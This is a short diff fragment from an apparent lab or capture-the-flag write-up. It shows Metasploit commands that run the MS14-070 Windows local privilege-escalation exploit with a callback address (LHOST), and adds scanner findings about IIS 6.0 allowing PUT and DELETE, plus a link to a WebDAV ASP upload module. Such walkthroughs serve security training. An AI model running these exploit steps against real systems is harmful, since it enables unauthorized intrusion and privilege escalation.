@@ -89,4 +89,8 @@ msf exploit(windows/local/ms14_070_tcpip_ioctl) > set LHOST 10.10.14.11
 LHOST => 10.10.14.11
 msf exploit(windows/local/ms14_070_tcpip_ioctl) > run
 ```
-
+#### WHY
++ Server: Microsoft-IIS/6.0
++ OSVDB-397: PUT HTTP method 'PUT' allows clients to save files on the web server.
++ OSVDB-5646: DELETE HTTP method 'DELETE' allows clients to delete files on the web server.
+https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_upload_asp
